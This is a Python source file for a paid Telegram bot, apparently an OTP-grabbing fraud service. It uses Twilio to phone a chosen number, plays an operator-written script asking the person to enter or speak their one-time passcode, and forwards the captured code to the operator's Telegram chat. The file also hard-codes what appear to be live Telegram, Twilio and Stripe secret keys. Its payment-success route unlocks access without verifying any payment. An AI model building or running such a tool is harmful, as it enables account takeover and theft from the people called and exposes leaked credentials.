# otp.py
import os
import asyncio
import threading
import logging
from datetime import datetime, timedelta, timezone
from urllib.parse import quote

import requests
from flask import Flask, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters
)
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
import stripe

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("otp")

# -------------------------
# Config / Secrets
# -------------------------
# Prefer env vars on Render. If you still run locally, the fallbacks below will use your old values.
PORT = int(os.environ.get("PORT", 5000))
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL")  # e.g. https://otp-xxxx.onrender.com
# If you insist on using ngrok locally, set NGROK_URL env var. Otherwise we use RENDER_EXTERNAL_URL.
PUBLIC_BASE_URL = os.environ.get("NGROK_URL") or RENDER_EXTERNAL_URL

# Telegram
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN") or "8132484421:AAGxuNJGTn_QPZO1Etb0X7bPyw31BoTho74"

# Twilio
TWILIO_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID") or "ACd5dfa4d64ce837519f56fc47fb0f28e3"
TWILIO_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN") or "2599dccc76cd9f0d0e43d2246a4ca905"
TWILIO_PHONE_NUMBER = os.environ.get("TWILIO_PHONE_NUMBER") or "+18319992984"
twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

# Stripe
STRIPE_SECRET_KEY = os.environ.get("STRIPE_SECRET_KEY") or "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"
stripe.api_key = STRIPE_SECRET_KEY

if not PUBLIC_BASE_URL:
    log.warning("PUBLIC_BASE_URL is not set. Set RENDER_EXTERNAL_URL in Render (or NGROK_URL locally).")

# -------------------------
# State storage
# -------------------------
user_phone = {}          # Telegram user -> phone number
phone_to_chat = {}       # phone -> Telegram chat ID
captured_otp = {}        # phone -> OTP
last_message = {}        # Telegram user -> last custom message
# Seed a paid user if you want (your original example). Safe to keep or remove:
paid_users = {6910149689: datetime.now(timezone.utc) + timedelta(days=4)}  # user_id -> paid_until

# -------------------------
# Helpers
# -------------------------
def is_paid(user_id: int) -> bool:
    return user_id in paid_users and datetime.now(timezone.utc) < paid_users[user_id]

def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("📱 Set Phone", callback_data="setphone")],
        [InlineKeyboardButton("ℹ️ Help / Usage", callback_data="help")]
    ]
    if not is_paid(user_id):
        keyboard.insert(1, [InlineKeyboardButton("💳 Pay $25 / 4 Days", callback_data="pay")])
    if user_id in user_phone:
        keyboard[0].append(InlineKeyboardButton("📞 Make Call", callback_data="call"))
    return InlineKeyboardMarkup(keyboard)

def create_checkout_session(user_id: int, customer_email: str | None = None) -> str:
    if not PUBLIC_BASE_URL:
        raise RuntimeError("PUBLIC_BASE_URL is not set; cannot create Stripe success/cancel URLs.")
    session = stripe.checkout.Session.create(
        payment_method_types=["card"],
        line_items=[{
            "price_data": {
                "currency": "usd",
                "product_data": {"name": "4-Day Survivor Access"},
                "unit_amount": 2500,  # $25
            },
            "quantity": 1,
        }],
        mode="payment",
        customer_email=customer_email,
        success_url=f"{PUBLIC_BASE_URL}/success?user_id={user_id}",
        cancel_url=f"{PUBLIC_BASE_URL}/cancel"
    )
    return session.url

# -------------------------
# Telegram Bot (async)
# -------------------------
application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to Yoda's OTP Bot!\n\nUse the buttons below:",
        reply_markup=get_main_keyboard(update.effective_user.id)
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Works for both /help and Help button
    chat_id = update.effective_chat.id if update.effective_chat else (
        update.callback_query.message.chat.id if update.callback_query else None
    )
    if update.callback_query:
        await update.callback_query.answer()
    if chat_id:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "ℹ️ *How to use this bot:*\n\n"
                "1. Tap *📱 Set Phone* to save your number.\n"
                "2. Tap *📞 Make Call* and enter your custom message.\n"
                "3. The bot will call you and capture the OTP.\n"
                "4. You’ll get the OTP back in this chat ✅"
            ),
            parse_mode="Markdown",
            reply_markup=get_main_keyboard(update.effective_user.id)
        )

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "pay":
        try:
            checkout_url = create_checkout_session(user_id=uid)
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"💳 Complete payment here: {checkout_url}"
            )
        except Exception as e:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"❌ Could not start checkout: {e}"
            )
        return

    if query.data in ["setphone", "call"] and not is_paid(uid):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="💰 You must pay $25 for 4 days to use this feature."
        )
        return

    if query.data == "setphone":
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")]])
        await query.edit_message_text(
            "📱 Please send me your phone number in the format: `+1XXXXXXXXXX`",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
        context.user_data["awaiting_phone"] = True

    elif query.data == "call":
        if uid not in user_phone:
            await query.edit_message_text(
                "⚠️ Please set your phone first with 📱 Set Phone.",
                reply_markup=get_main_keyboard(uid)
            )
        else:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")],
                [InlineKeyboardButton("ℹ️ Info / Usage", callback_data="help")]
            ])
            await query.edit_message_text(
                "📞 Send me your custom message for the call.\n\nOr type `/call` to reuse your last message.",
                reply_markup=keyboard
            )
            context.user_data["awaiting_message"] = True

    elif query.data == "help":
        await help_command(update, context)

    elif query.data == "menu":
        await query.edit_message_text("Main Menu:", reply_markup=get_main_keyboard(uid))

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()

    if not is_paid(uid):
        await update.message.reply_text("💰 You must pay $25 for 4 days to use this feature.")
        return

    if context.user_data.get("awaiting_phone"):
        user_phone[uid] = text
        phone_to_chat[text] = update.effective_chat.id
        context.user_data["awaiting_phone"] = False
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📞 Make Call", callback_data="call")],
            [InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")],
            [InlineKeyboardButton("ℹ️ Info / Usage", callback_data="help")]
        ])
        await update.message.reply_text(
            f"✅ Phone number saved: {text}\nChoose an option below:",
            reply_markup=keyboard
        )
        return

    if context.user_data.get("awaiting_message"):
        last_message[uid] = text
        context.user_data["awaiting_message"] = False
        phone = user_phone[uid]
        base = PUBLIC_BASE_URL
        if not base:
            await update.message.reply_text("❌ Server URL not configured. Set RENDER_EXTERNAL_URL.")
            return
        twilio_client.calls.create(
            to=phone,
            from_=TWILIO_PHONE_NUMBER,
            url=f"{base}/voice?msg={quote(text)}",
            status_callback=f"{base}/call_status",
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
            status_callback_method='POST'
        )
        await update.message.reply_text(f"📞 Calling {phone} now with your message...")
        return

    if text == "/call":
        if uid not in last_message:
            await update.message.reply_text("⚠️ No previous message found. Please send a new one.")
            return
        phone = user_phone.get(uid)
        if not phone:
            await update.message.reply_text("⚠️ Please set your phone first with 📱 Set Phone.")
            return
        base = PUBLIC_BASE_URL
        if not base:
            await update.message.reply_text("❌ Server URL not configured. Set RENDER_EXTERNAL_URL.")
            return
        twilio_client.calls.create(
            to=phone,
            from_=TWILIO_PHONE_NUMBER,
            url=f"{base}/voice?msg={quote(last_message[uid])}",
            status_callback=f"{base}/call_status",
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
            status_callback_method='POST'
        )
        await update.message.reply_text(f"📞 Re-calling {phone} with your last message...")

# Register handlers
application.add_handler(CommandHandler("start", start))
application.add_handler(CallbackQueryHandler(handle_buttons))
application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

# -------------------------
# Flask (Twilio/Stripe + Telegram Webhook)
# -------------------------
flask_app = Flask(__name__)

@flask_app.route("/", methods=["GET"])
def root():
    return "OK", 200

@flask_app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
def telegram_webhook():
    # Telegram will POST updates here
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            return "no json", 200
        update = Update.de_json(data, application.bot)
        # Schedule processing on the bot loop
        fut = asyncio.run_coroutine_threadsafe(application.process_update(update), bot_loop)
        fut.result(timeout=10)  # wait briefly to surface errors (optional)
        return "OK", 200
    except Exception as e:
        log.exception("webhook error: %s", e)
        # Always 200 to avoid Telegram retry storms; your logs will show the exception.
        return "OK", 200

@flask_app.route("/voice", methods=["POST", "GET"])
def voice():
    message = request.args.get("msg", "Please enter your OTP now.")
    resp = VoiceResponse()
    gather = Gather(
        input="dtmf speech",
        timeout=10,
        num_digits=6,
        action=f"{PUBLIC_BASE_URL}/capture",   # ✅ absolute URL
        method="POST"
    )
    gather.say(message)
    gather.say("Now, please enter or speak your OTP.")
    resp.append(gather)
    resp.say("No input received. Goodbye!")
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/capture", methods=["POST"])
def capture():
    otp = request.values.get("Digits") or request.values.get("SpeechResult")
    to_number = request.values.get("To")   # ✅ the user’s number (we dialed this)
    log.info("Twilio /capture To=%s OTP=%s", to_number, otp)

    if to_number and otp:
        captured_otp[to_number] = otp
        chat_id = phone_to_chat.get(to_number)
        if chat_id:
            try:
                fut = asyncio.run_coroutine_threadsafe(
                    application.bot.send_message(chat_id=chat_id, text=f"📩 Captured OTP: {otp}"),
                    bot_loop
                )
                fut.result(timeout=5)
            except Exception:
                log.exception("Failed to send OTP to Telegram")

    resp = VoiceResponse()
    resp.say("Thanks! Your OTP has been captured. Goodbye!")
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/call_status", methods=["POST"])
def call_status():
    call_status_val = request.values.get("CallStatus")
    to_number = request.values.get("To")   # ✅ consistent with phone_to_chat
    chat_id = phone_to_chat.get(to_number)
    log.info("Call status %s for %s", call_status_val, to_number)

    if chat_id:
        status_map = {
            "initiated": "📞 Call has been initiated.",
            "ringing": "📲 Call is ringing.",
            "answered": "✅ Call was picked up.",
            "completed": "📴 Call has ended.",
            "no-answer": "❌ Call was not answered."
        }
        msg = status_map.get(call_status_val, f"ℹ️ Call status: {call_status_val}")
        try:
            fut = asyncio.run_coroutine_threadsafe(
                application.bot.send_message(chat_id=chat_id, text=msg),
                bot_loop
            )
            fut.result(timeout=5)
        except Exception:
            log.exception("Failed to send call status to Telegram")
    return ("", 204)
    
@flask_app.route("/success")
def payment_success():
    user_id = request.args.get("user_id")
    if not user_id:
        return "Error: user ID not found."
    user_id = int(user_id)
    paid_users[user_id] = datetime.now(timezone.utc) + timedelta(days=4)
    return f"✅ Payment received! User {user_id} now has access for 4 days."

@flask_app.route("/cancel")
def payment_cancel():
    return "Payment canceled. You do not have access."

# -------------------------
# Bot loop thread + startup
# -------------------------
def bot_loop_thread():
    # This loop lives only for the bot and runs forever in a daemon thread
    global bot_loop
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)

    async def _startup():
        await application.initialize()
        await application.start()
        # Optionally set webhook automatically if PUBLIC_BASE_URL is configured
        try:
            if PUBLIC_BASE_URL:
                url = f"{PUBLIC_BASE_URL}/{TELEGRAM_TOKEN}"
                await application.bot.set_webhook(url)
                log.info("Webhook set to %s", url)
            else:
                log.warning("PUBLIC_BASE_URL not set; skipping auto set_webhook.")
        except Exception:
            log.exception("Failed to set webhook")

    bot_loop.run_until_complete(_startup())
    log.info("Bot loop running.")
    bot_loop.run_forever()

# Start the bot loop in background
bot_loop = None
t = threading.Thread(target=bot_loop_thread, name="bot-loop", daemon=True)
t.start()

# -------------------------
# Main (Flask in main thread)
# -------------------------
if __name__ == "__main__":
    log.info("Starting Flask on port %s", PORT)
    # Render launches this file with `python otp.py`
    flask_app.run(host="0.0.0.0", port=PORT)

